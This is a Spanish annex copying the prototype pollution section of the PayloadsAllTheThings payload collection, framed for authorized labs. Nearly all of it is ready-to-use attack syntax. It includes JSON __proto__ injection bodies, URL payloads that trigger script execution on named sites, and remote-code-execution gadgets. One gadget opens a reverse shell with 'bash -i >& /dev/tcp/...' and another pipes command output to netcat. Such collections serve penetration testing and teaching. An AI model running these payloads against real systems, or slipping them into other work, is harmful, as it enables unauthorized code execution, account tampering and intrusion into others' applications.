# Prototype pollution: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Prototype Pollution/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Prototype%20Pollution/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Contaminación de prototipos / Metodología

```js
var myDog = new Dog();
```

```js
// Points to the function "Dog"
myDog.constructor;
```

```js
// Points to the class definition of "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Variantes presentes en tablas o texto del apartado

```text
Object.prototype
```

## 2. Metodología / Ejemplos

```js
    let config = {
        isAdmin: false
    };
```

```js
    Object.prototype.isAdmin = true;
```

### Variantes presentes en tablas o texto del apartado

```text
Object.prototype
```

## 3. Metodología / Manual Pruebas

### Variantes presentes en tablas o texto del apartado

```text
{ "__proto__":{"parameterLimit":1}}
{ "__proto__":{"ignoreQueryPrefix":true}}
??foo=bar
{ "__proto__":{"allowDots":true}}
?foo.bar=baz
{ "__proto__":{"json spaces":" "}}
{"foo":"bar"}
{"foo": "bar"}
{ "__proto__":{"exposedHeaders":["foo"]}}
Access-Control-Expose-Headers
{ "__proto__":{"status":510}}
```

## 4. Metodología / Contaminación de prototipos via JSON Input

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### Variantes presentes en tablas o texto del apartado

```text
__proto__
JSON.parse()
```

## 5. Metodología / Contaminación de prototipos in URL

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

## 6. Metodología / Contaminación de prototipos Exploitation

```js
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```js
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
```

## 7. Metodología / Contaminación de prototipos Payloads

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
